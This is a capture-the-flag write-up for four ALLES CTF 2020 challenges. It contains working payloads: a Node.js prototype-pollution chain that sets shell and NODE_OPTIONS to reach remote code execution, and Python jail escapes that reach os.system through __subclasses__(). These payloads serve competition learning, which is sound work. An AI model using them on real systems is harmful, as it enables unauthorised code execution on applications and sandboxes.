# ALLES CTF 2020

![ALLES](images/alles.png)

#### Challenges

[Push](#push)  
[OnlyFreights](#onlyfreights)  
[Pyjail_ATricks](#pyjail_atricks)  
[Pyjail_Escape](#pyjail_escape)

<a name="push"/>

## Push

https://push.ctf.allesctf.net/

Upon opening the challenge link, there is nothing much to see:

![push_message](images/p_1.png)

At first, i couldn't figure out what's going on, but when i `curl`'ed it,
there is something interesting

![push_headers](images/p_2.png)

The server is using HTTP/2, which is very unusual.

Now it's clear, refering back to the challenge's title.
The server is obviously using `HTTP Server Push`

Basically, Server push allows sites to send assets to the user before the user asks for it, so when we request /index.html,
the server can request others ressources, in our case, the FLAG.

<h4> So how do we get the flag ?</h4>

Most nowadays tools and proxies like Burp doesn't support HTTP/2,
that's why no matter what proxy you use, you can't see the hidden
requests.

The way i solved it is by using Chrome Net Export tool

![chrome_net_exports](images/p_3.png)

We start Logging, refresh the challenge page, then stop logging.
a file will be generated, and that's it

A file will be generated, it contains all the requests done during the logging, let's search for the flag:

![chrome_log_file](images/p_4.png)

![chrome_log_file](images/p_5.png)

**FLAG:** `ALLES{http2_push_dashdash_force}`

<a name="onlyfreights"/>

## OnlyFreights

<b>Description:</b>

```
Check out my OnlyFreights! A website to classify all the freight ships.

NOTE: There is a secret cargo stored at /flag.txt,

but you need to convince the /guard executable to hand it to you!

Challenge Files:   only-freights.zip
```

##Writeup

### PART1: Getting an RCE

First thing i did, was to check the site ... nothing interesting,
then i started reading the code. it's a Node/Express.Js app,
with 3 Routes:

![routes_1](images/of_1.png)

![routes_1](images/of_2.png)

With the second route, we can Add/Edit objects.
And the third route, apparenlty it's just spawning a child process
and executing the `ps` command.

With some googling, we find out it's a `Javascript Prototype Pollution` attack, that can lead us to an RCE if we combine it with the last Route.

<b>First things first, what is a Prototype Pollution ?</b>

Javascript allows ALL Object attributes to be modified, including the magic attributes like `constructor`, `prototype`, and `__proto__`. And because all objects in JS inherits from `Object`, any change in the prototype of `Object` will automatically apply to
all future created objects.

Let's have some examples:

![pp_example1](images/of_3.png)

`guest` doesn't have an `isAdmin` property, So when we pollute the prototype by adding a new property, and then if we try to access `isAdmin` which is not present in `guest` it will automatically look up to the base object which NOW has the `isAdmin` set to `true`

Here is another example, this time by changing the toString() method:

![pp_example2](images/of_4.png)

Basically, `Prototype Pollution` helps the attacker to manipulate attributes, by overwriting, or polluting, a JavaScript object prototype of the base object by injecting other values. Properties on the Object.prototype are then inherited by all the JavaScript objects through the prototype chain.

<b>Okay so how will this help us get an RCE ? </b>

Changing some attributes is great, but in this case it's not really helpful.

We need to find what attributes we can pollute to trigger
a command execution when spawning a child process.

The answer is: `ENVIRONMENT variables`

<b>But why ?</b>

When reading the [official documentation](https://nodejs.org/api/child_process.html) of child processes in Nodejs.
We can see that when we spawn a new process, we can specify certain options, and guess what ? they have DEFAULT valeus:

![doc](images/of_6.png)

The ones that interrest us the most are `env` and `shell`, focus with me:

if `env` is not defined, `process.env` will be used, so if we pollute the `protoype` with some `env` variables, it will use the ones we defined and not `process.env`

and if `shell` is not defined, `/bin/sh` will be used, but that's not what we want, we need to pollute it with `node` as a value, because we want to execute Javascript code.

<b>What are the env variables we need to inject ?</b>

This is a tricky part, it turns out, the `node` cli allows to use the env variable named `NODE_OPTIONS`, it allows to specify certain options for the `node` command. such as `--eval` and `--require`, but sadly `--eval` is not allowed within `NODE_OPTIONS`, probably to prevent this exact attack :3
You can check the full list of options [here](https://nodejs.org/api/cli.html)

We are left with `--require`, it will include and execute an external JS file .... Hmmm, but what can we include ?

Why not create an env variable with a Node.JS code, and use `--require` to include `/proc/self/environ`

YEAH !!! THIS IS EXACTLY THE WAY TO GO

<b>Note:</b> this is why we have to set `shell` to `node`, otherwise, `NODE_OPTIONS` will just be ignored.

<b>Let's try it:</b>

Pollute `shell`

![pollute_shell](images/of_7.png)

Pollute `env`

![pollute_env](images/of_8.png)

Check OUTPUT:

![command_exec](images/of_9.png)

And with a Shell execution:

```JSON
{"aaaa":"console.log(require('child_process').execSync('ls').toString());//"}
```

![command_exec](images/of_10.png)

Et VOILA!

We have a pretty good Command Execution.

<b>What's next ?</b>

We're finished with PART1
Yeah, yeah, and this is the easiest part,
the hardest is yet to come.

### PART 2: Reading the flag

It's not as simple as executing `/guard`,
if you take a look at the source code, to get the flag
we have to execute `/guard` and interact with it, we have
to give the correct answer for the sum of two random numbers:

![guard_exec](images/of_11.png)

The first thought of course is to get a reverse shell, and directly interract with
the binary, but it's not possible, at least i couldn't, and it is not the intended solution anyway.

The easiest solution is to use python with subprocess module, but sadly `python` is
not installed on the server. so the only left solution is to use pure `sh` with `named pipes`.

The steps are as follows:

1. create two pipes: `pin` and `pout`, one for `stdin` and one of `stdout`
2. run `/guard` in the background and redirect its `stdin` and `stdout` to the two pipes created
3. read the two random numbers from `pout`
4. Calculate the sum, and send it to `pin`
5. read the response from `pout` which should be the flag.

```bash
#!/bin/sh
mkfifo /tmp/pout /tmp/pin 2> /dev/null
exec 3<> /tmp/pout
exec 4<> /tmp/pin
./guard > /tmp/pout < /tmp/pin &
read -t 1 out <&3
# ${out%?} to remove last letter; and $((${out%?})) to eval the sum
echo $((${out%?})) > /tmp/pin
read -t 1 out <&3
echo $out
```

I tried this locally, it worked and showed me the fake flag. but running this on the server didn't work, i couldn't understand, I struggled a lot with this step, changed script little, nothing worked.

I almost gave up on this challenge, but then i wanted to give it another shot, i decided to start over, with the same steps as above BUT this time, i waned a One-line script that does all of the above steps.

I came up with:

```bash
mkfifo /tmp/pipe

cat /tmp/pipe | /guard  | (read -t 1 out; echo $((${out%?})) > /tmp/pipe; cat)
```

<b>Explanation:</b>

Because of the pipes, the command will be executed from right to left, so first:
`(read -t 1 out; echo $((${out%?})) > /tmp/pipe; cat)` is executed.
the command `read` takes input from stdin and store in `$out`, and in this
case `stdin` is the outpout of `/guard` i.e the two random numbers, then the sum is
calculated, and the result is stored in `/tmp/pipe`.
after that, `/guard` will take input from `stdin` which is passed from the `/tmp/pipe` which now contains the result of the sum.

<b>Guess what ?</b>
Even this code works only locally, not on the server :3
But this time it shows `Wrong!`.
At Least that's an improvement, we get to see an output Lool

After some debugging, i found out that somehow `read` is not taking the output of `./guard`.
I still don't know why.
So i had to change `read` with something equivalent.
I thought let's try reading directly from `/dev/stdin`

```bash
cat /tmp/pipe | /guard | (l=$(head -c 24 /dev/stdin); echo $((l)) > /tmp/pipe;cat)
```

**Note:** I'm using `head -c 24` to take exactly the amount of characters i need, without the `=` symbol

Let's try this time:

```JavaScript

{
    "value":{
        "aaaa":"console.log(require('child_process').execSync('cat /tmp/pipe | /guard | (l=$(head -c 24 /dev/stdin); echo $((l)) > /tmp/pipe;cat)').toString());//",
        "NODE_OPTIONS":"--require /proc/self/environ"
    }
}
```

![final_flag](images/of_12.png)

**Flag:** `ALLES{Gr3ta_w0uld_h4te_th1s_p0lluted_sh3ll}`

<a name="pyjail_atricks"/>

# Pyjail_ATricks

**Description**

```
Run the secret function you must! Hrrmmm. A flag maybe you will get.
```

**Solution**

After connecting to the server, we quickly notices lot of chars are filtered

So i typed all of printable chars to get the blacklisted and whitelisted chars:

```
>>> a = 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
4
5
6
8
b
f
h
j
k
m
q
u
w
x
y
z
b
f
h
j
k
m
q
u
w
x
y
z
!
#
$
%
&
*
,
-
/
:
;
<
=
>
?
@
\
^
`
{
|
}
~
Denied
```

From this we extract the white listed chars:

```
012379acdegilnoprstv"'()+.[]_
```

First i wanted to print `__builtins__` but `b` and `u` are blacklisted, so i replaced `b` with `eval.__doc__[37+9+1]` and `u` with `eval.__doc__[3+1]`

```python
>>> a = eval("print(__"+eval.__doc__[37+9+1]+eval.__doc__[3+1]+"iltins__.__dict__)")
{'repr': <built-in function repr>, 'str': <class 'str'>, 'print':
<built-in function print>, 'eval': <built-in function eval>,
'input': <built-in function input>, 'any': <built-in function
any>, 'exec': <built-in function exec>, 'all': <built-in function
all>, 'Exception': <class 'Exception'>}
```

I quickly noticed that `input` is allowed, let's use it:

```python
>>> a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
ALLES()
No flag for you!
```

Probably it expects an argument.
So Let's inspect the function ALLES

```python
>>> a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
ALLES.__code__.co_consts
(None, 'p\x7f\x7frbH\x00DR\x07CRUlJ\x07DlRe\x02N', 'No flag for you!')

>>> a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
ALLES.__code__.co_names
('string_xor',)
```

there is a non printable constant, and a probably a function called `string_xor` we can try to xor `p\x7f\x7frbH\x00DR\x07CRUlJ\x07DlRe\x02N` with `ALLES{`

```python
>>> from pwn import xor
>>> xor('p\x7f\x7frbH\x00DR\x07CRUlJ\x07DlRe\x02N','ALLES{')
b'133713A\x08\x1eB\x10)\x14 \x06B\x17\x17\x13)N\x0b'
>>> xor('p\x7f\x7frbH\x00DR\x07CRUlJ\x07DlRe\x02N','1337')
b'ALLES{3sc4ped_y0u_aR3}'
```

**FLAG:** `ALLES{3sc4ped_y0u_aR3}`

<a name="pyjail_escape"/>

# Pyjail_Escape

**Description**

```
Python leave you must, to be master real!
```

**Solution**

Because of the previous challenge we know

we can use `input` to execute pretty much anything and bypass the blacklisted chars

Let's print all subclasses()

```python
>>> a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
"".__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>,
 <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>,
 <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>,
 <class 'dict_items'>, <class 'odict_iterator'>, <class 'set'>, <class 'str'>, <class 'slice'>, <class 'staticmethod'>,
 <class 'complex'>, <class 'float'>, <class 'frozenset'>, <class 'property'>, <class 'managedbuffer'>,
 <class 'memoryview'>, <class 'tuple'>, <class 'enumerate'>, <class 'reversed'>, <class 'stderrprinter'>,
 <class 'code'>, <class 'frame'>, <class 'builtin_function_or_method'>, <class 'method'>, <class 'function'>,
 <class 'mappingproxy'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'wrapper_descriptor'>, <class 'method-wrapper'>, <class 'ellipsis'>,
 <class 'member_descriptor'>, <class 'types.SimpleNamespace'>, <class 'PyCapsule'>, <class 'longrange_iterator'>, <class 'cell'>, <class 'instancemethod'>, <class 'classmethod_descriptor'>,
 <class 'method_descriptor'>, <class 'callable_iterator'>, <class 'iterator'>, <class 'coroutine'>, <class 'coroutine_wrapper'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>,
 <class 'formatteriterator'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class 'moduledef'>, <class 'module'>, <class 'BaseException'>,<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>,
 <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib._installed_safely'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>,
 <class 'classmethod'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread._localdummy'>, <class '_thread._local'>,
 <class '_thread.lock'>, <class '_thread.RLock'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>,
 <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>,
 <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'abc.ABC'>,
 <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'async_generator'>, <class 'collections.abc.Iterable'>, <class 'bytes_iterator'>,
 <class 'bytearray_iterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_itemiterator'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'range_iterator'>,
 <class 'set_iterator'>, <class 'str_iterator'>, <class 'tuple_iterator'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>,
 <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>,
 <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>]
```

We need `os._wrap_close` to execute `system` function

```python
>>> a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["system"]("ls -la")
total 40
drwxr-xr-x. 2 root root   131 Sep  3 18:27 .
drwxr-xr-x. 3 root root    17 Jul 22 18:42 ..
-rw-r--r--. 1 root root   220 Apr  4  2018 .bash_logout
-rw-r--r--. 1 root root  3771 Apr  4  2018 .bashrc
-rw-r--r--. 1 root root   807 Apr  4  2018 .profile
-rw-r--r--. 1 root root    29 Aug 29 15:20 LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt
-rwxr-xr-x. 1 root root  1328 Sep  3 18:27 pyjail.py
-rwxr-xr-x. 1 root root 18744 Jul 22 18:50 ynetd
```

Let's read `LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt`:

```python
>>> a = print(eval(eval("inp"+eval.__doc__[3+1]+"t()")))
"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["system"]("cat LOS7Z9XYZU8YS89Q24PPHMMQFQ3Y7RIE.txt")
ALLES{th1s_w4s_a_r34l_3sc4pe}
```

**Flag:** `ALLES{th1s_w4s_a_r34l_3sc4pe}`

As simple as that x)
